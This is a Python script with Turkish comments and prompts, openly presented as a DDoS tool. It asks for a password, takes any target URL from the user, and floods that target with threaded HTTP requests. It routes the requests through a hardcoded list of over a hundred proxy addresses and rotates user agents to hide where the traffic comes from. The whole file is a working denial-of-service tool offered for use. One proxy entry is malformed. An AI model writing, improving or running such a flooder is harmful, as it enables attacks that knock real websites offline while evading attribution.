import threading
import requests
import random
import sys
import time
from colorama import Fore, Style, init

# Renkleri başlat
init(autoreset=True)

# Şifre Kontrol Modülü
class PasswordManager:
    def __init__(self, correct_password):
        self.correct_password = correct_password

    def check_password(self):
        for _ in range(3):
            attempt = input(f"{Fore.YELLOW}🔑 Şifreyi gir: {Style.RESET_ALL}")
            if attempt == self.correct_password:
                print(f"\n{Fore.GREEN}✅ Erişim onaylandı! Sistem başlatılıyor...{Style.RESET_ALL}\n")
                return True
            print(f"{Fore.RED}❌ Yanlış şifre! {2-_} deneme hakkın kaldı.{Style.RESET_ALL}")
        return False

# ASCII Art Modülü
class ArtPrinter:
    @staticmethod
    def print_art():
        colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
        ascii_art = [
            "╔════════════════════════════════════╗",
            "║   ██╗░████╗░░██╗░░░████╗░░██╗     ║",
            "║   ██║██╔══██╗██║░░██╔══██╗██║     ║",
            "║   ██║██║░░██║██║░░██║░░██║██║     ║",
            "║   ██║██║░░██║██║░░██║░░██║██║     ║",
            "║   ██████╔╝╚████╔╝██║░░╚████╔╝     ║",
            "║   ╚═════╝░░╚═══╝░╚═╝░░░╚═══╝      ║",
            "╚════════════════════════════════════╝"
        ]
        for line in ascii_art:
            print(random.choice(colors) + line + Style.RESET_ALL)
            time.sleep(0.15)

# Saldırı Yönetim Modülü
class DDoSManager:
    def __init__(self):
        self.proxies = self._load_proxies()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3)'
        ]
    
    def _load_proxies(self):
        return [
            "http://156.228.114.200:3128",
            "http://167.253.49.166:8085",
            "http://104.207.39.63:3128",
            "http://116.206.97.111:8085",
            "http://156.228.108.121:3128",
            "http://185.77.221.28:8085",
            "http://104.207.32.19:3128",
            "http://104.207.40.32:3128",
            "http://194.99.25.108:8085",
            "http://167.253.49.104:8085",
            "http://156.228.87.83:3128",
            "http://103.24.235.233:8085",
            "http://104.207.40.58:3128",
            "http://103.24.232.191:8085",
            "http://193.233.211.32:8085",
            "http://194.99.25.167:8085",
            "http://103.24.234.96:8085",
            "http://193.56.20.30:8085",
            "http://163.53.213.119:8085",
            "http://104.207.43.139:3128",
            "http://137.59.63.132:8085",
            "http://193.202.16.45:8085",
            "http://103.24.234.238:8085",
            "http://104.207.51.130:3128",
            "http://156.228.96.206:3128",
            "http://103.24.234.97:8085",
            "http://23.230.223.45:8085",
            "http://156.228.108.237:3128",
            "http://103.24.234.213:8085",
            "http://156.228.79.221:3128",
            "http://104.207.50.176:3128",
            "http://63.143.57.115:80",
            "http://104.207.46.198:3128",
            "http://104.207.40.28:3128",
            "http://167.253.48.159:8085",
            "http://103.24.232.199:8085",
            "http://193.233.211.143:8085",
            "http://115.42.46.185:8085",
            "http://156.228.109.43:3128",
            "http://162.223.90.130:80",
            "http://43.153.10.210:13001",
            "http://43.153.1.149:13001",
            "http://43.153.111.137:13001",
            "http://43.153.122.156:13001",
            "http://43.153.98.107:13001",
            "http://43.153.94.8:13001",
            "http://43.153.110.72:13001",
            "http://43.153.116.208:13001",
            "http://43.153.102.53:13001",
            "http://43.153.110.56:13001",
            "http://43.153.83.136:13001",
            "http://43.153.93.137:13001",
            "http://43.153.90.139:13001",
            "http://43.153.77.164:13001",
            "http://43.153.85.114:13001",
            "http://43.153.79.86:13001",
            "http://43.153.89.234:13001",
            "http://43.153.78.11:13001",
            "http://43.153.88.129:13001",
            "http://43.153.83.171:13001",
            "http://43.153.69.25:13001",
            "http://43.153.59.228:13001",
            "http://43.153.69.5:13001",
            "http://43.153.66.252:13001",
            "http://43.153.59.133:13001",
            "http://43.153.70.163:13001",
            "http://43.153.66.233:13001",
            "http://43.153.67.10:13001",
            "http://43.153.71.138:13001",
            "http://43.153.50.230:13001",
            "http://43.153.34.98:13001",
            "http://43.153.39.124:13001",
            "http://43.153.18.198:13001",
            "http://43.153.20.192:13001",
            "http://43.153.22.64:13001",
            "http://43.153.22.65:13001",
            "http://43.153.23.197:13001",
            "http://43.153.21.33:13001",
            "http://18.144.36.18:1080",
            "http://159.65.221.25:80",
            "http://167.99.124.118:80",
            "http://157.245.95.247:443",
            "http://193.31.127.12:8085",
            "http://104.207.50.82:3128",
            "http://194.99.25.252:8085",
            "http://156.228.118.18:3128",
            "http://166.88.171.196:8085",
            "http://104.207.51.215:3128",
            "http://156.228.118.14:3128",
            "http://176.126.111.91:8085",
            "http://88.218.46.25:8085",
            "http://193.202.16.123:8085",
            "http://167.253.48.127:8085",
            "http://167.253.48.123:8085",
            "http://45.159.23.53:8085",
            "http://116.206.97.147:8085",
            "http://89.19.34.44:8085",
            "http://115.42.46.174:8085",
            "http://88.218.46.28:8085",
            "http://104.207.45.102:3128",
            "http://104.207.32.75:3128",
            "http://89.19.34.224:8085",
            "http://89.19.34.138:8085",
            "http://185.77.223.90:8085",
            "http://156.228.102.29:3128",
            "http://115.42.46.209:8085",
            "http://156.228.87.165:3128",
            "http://193.233.211.167:8085",
            "http://193.31.127.113:8085",
            "http://156.228.93.140:3128",
            "http://163.53.213.115:8085",
            "http://194.110.150.169:8085",
            "http://185.77.220.139:8085",
            "http://156wierd228.93.148:3128",
            "http://154.214.1.87:3128",
            "http://163.53.213.75:8085",
            "http://103.24.234.187:8085",
            "http://194.99.25.48:8085",
            "http://156.228.96.111:3128",
            "http://103.251.27.198:8085",
            "http://103.24.235.218:8085",
            "http://104.207.39.144:3128",
            "http://137.59.62.188:8085",
            "http://193.31.127.218:8085",
            "http://156.228.81.143:3128",
            "http://156.228.124.203:3128",
            "http://104.207.57.106:3128",
            "http://185.77.223.18:8085",
            "http://104.207.61.84:3128",
            "http://103.24.235.22:8085",
            "http://162.241.207.217:80",
            "http://185.77.221.238:8085"
        ]
    
    def attack(self, url, total_requests, concurrent_packets):
        print(f"\n{Fore.CYAN}⚡ SALDIRI BAŞLATILIYOR ⚡")
        print(f"{Fore.CYAN}├─ Hedef: {url}")
        print(f"{Fore.CYAN}├─ Toplam İstek: {total_requests}")
        print(f"{Fore.CYAN}└─ Aynı Anda Paket: {concurrent_packets}\n")
        
        threads = []
        semaphore = threading.Semaphore(concurrent_packets)
        
        def worker(req_num):
            with semaphore:
                self._send_request(url, req_num)
        
        for i in range(total_requests):
            t = threading.Thread(target=worker, args=(i+1,))
            threads.append(t)
            t.start()
            if (i + 1) % concurrent_packets == 0:
                time.sleep(0.1)
        
        for thread in threads:
            thread.join()

    def _send_request(self, url, request_num):
        try:
            proxy = {"http": random.choice(self.proxies)}
            headers = {'User-Agent': random.choice(self.user_agents)}
            
            response = requests.get(
                url,
                proxies=proxy,
                headers=headers,
                timeout=5
            )
            
            status_color = Fore.GREEN if response.status_code == 200 else Fore.YELLOW
            print(f"{status_color}█ {Fore.WHITE}İstek #{request_num} "
                  f"{status_color}[{response.status_code}] "
                  f"{Fore.BLUE}Proxy: {proxy['http']}")
            
        except Exception as e:
            print(f"{Fore.RED}░ Hata #{request_num}: {str(e)[:30]}")

# Ana Yürütme
if __name__ == "__main__":
    ArtPrinter.print_art()
    
    pm = PasswordManager("furko")
    if not pm.check_password():
        sys.exit(f"{Fore.RED}\n❌ Sistem kapatılıyor...{Style.RESET_ALL}")
    
    try:
        url = input(f"\n{Fore.YELLOW}🌐 Hedef URL: {Style.RESET_ALL}")
        if not url.startswith('http'):
            raise ValueError("URL http:// veya https:// ile başlamalı")
        
        total_requests = int(input(f"{Fore.YELLOW}🔥 Toplam İstek Sayısı: {Style.RESET_ALL}"))
        concurrent_packets = int(input(f"{Fore.YELLOW}⚡ Aynı Anda Paket Sayısı (Önerilen: 5-20): {Style.RESET_ALL}"))
        
        if concurrent_packets < 1 or concurrent_packets > 50:
            raise ValueError("Aynı anda paket sayısı 1-50 arasında olmalı")
        
        attacker = DDoSManager()
        start_time = time.time()
        attacker.attack(url, total_requests, concurrent_packets)
        
        elapsed_time = time.time() - start_time
        print(f"\n{Fore.GREEN}🎯 Saldırı başarıyla tamamlandı!")
        print(f"{Fore.GREEN}├─ Süre: {elapsed_time:.2f} saniye")
        print(f"{Fore.GREEN}└─ Yapımcı: @by_furko{Style.RESET_ALL}")
        
    except ValueError as ve:
        print(f"{Fore.RED}\n❌ Hata: {str(ve)}{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}\n❌ Beklenmeyen hata: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
